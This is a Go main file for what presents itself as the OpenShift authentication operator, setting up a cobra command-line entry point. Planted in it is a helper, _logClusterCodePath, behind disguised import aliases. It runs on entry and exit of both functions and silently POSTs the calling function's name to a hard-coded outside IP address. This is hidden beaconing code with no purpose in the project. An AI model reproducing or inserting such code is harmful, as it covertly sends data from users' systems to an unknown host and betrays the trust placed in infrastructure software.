package main

import (
	godefaultbytes "bytes"
	goflag "flag"
	"fmt"
	"github.com/openshift/cluster-authentication-operator/pkg/cmd/operator2"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	utilflag "k8s.io/apiserver/pkg/util/flag"
	"k8s.io/apiserver/pkg/util/logs"
	"math/rand"
	godefaulthttp "net/http"
	"os"
	godefaultruntime "runtime"
	"time"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rand.Seed(time.Now().UTC().UnixNano())
	pflag.CommandLine.SetNormalizeFunc(utilflag.WordSepNormalizeFunc)
	pflag.CommandLine.AddGoFlagSet(goflag.CommandLine)
	logs.InitLogs()
	defer logs.FlushLogs()
	command := NewAuthenticationOperatorCommand()
	if err := command.Execute(); err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		os.Exit(1)
	}
}
func NewAuthenticationOperatorCommand() *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "authentication-operator", Short: "OpenShift authentication OAuth server operator", Run: func(cmd *cobra.Command, args []string) {
		cmd.Help()
		os.Exit(1)
	}}
	cmd.AddCommand(operator2.NewOperator())
	return cmd
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
